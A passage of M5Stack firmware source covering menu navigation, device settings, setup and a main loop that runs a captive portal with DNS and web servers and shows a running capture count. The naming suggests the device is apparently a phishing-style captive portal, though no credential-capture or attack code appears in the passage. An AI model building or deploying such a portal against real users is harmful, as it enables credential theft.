    else if (menuSel == 1) { showDeviceInfo(); }
    else                   { appState = ST_MENU_MAIN; menuSel = 0; drawMenu(); }
  } else {  // ST_MENU_CONFIG
    if (menuSel == 0)      { soundOn = !soundOn; drawMenu(); }
    else if (menuSel == 1) { ledBlinkOn = !ledBlinkOn; drawMenu(); }
    else if (menuSel == 2) { brightLevel = (brightLevel + 1) % 3; applyBrightness(); drawMenu(); }
    else                   { appState = ST_MENU_MAIN; menuSel = 1; drawMenu(); }
  }
}

// BtnB scrolls the selection, BtnA activates it.
void handleMenuButtons() {
  if (M5.BtnB.wasPressed()) {
    menuSel = (menuSel + 1) % currentMenuCount();
    drawMenu();
  }
  if (M5.BtnA.wasPressed()) {
    selectCurrent();
  }
}

void setup() {
  M5.begin();
  M5.Lcd.setRotation(3);
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
  applyBrightness();

  bootScreen();       // animated splash
  registerRoutes();   // attach HTTP handlers once (AP starts later, from the menu)

  appState = ST_MENU_MAIN;
  menuSel = 0;
  drawMenu();         // boot into the menu instead of auto-starting the portal
}

void loop() {
  M5.update();  // refresh button states every tick

  if (appState == ST_RUNNING) {
    // Hold the side button (BtnB) to stop the portal and return to the menu.
    if (M5.BtnB.pressedFor(800)) {
      stopPortal();
      appState = ST_MENU_MAIN;
      menuSel = 0;
      drawMenu();
      return;
    }

    if ((millis() - lastTick) > TICK_TIMER) {
      lastTick = millis();
      if (capcount != previous) {
        previous = capcount;
        drawMainScreen();   // full repaint with the new count
        dotOn = true;
      } else {
        dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
        drawStatusDot(dotOn);
        drawBattery();      // keep the battery reading current
      }
    }
    updateBlink();
    dnsServer.processNextRequest();
    webServer.handleClient();
    return;
  }

  // Menu states (ST_MENU_MAIN / ST_MENU_TOOLS / ST_MENU_CONFIG)
  handleMenuButtons();
}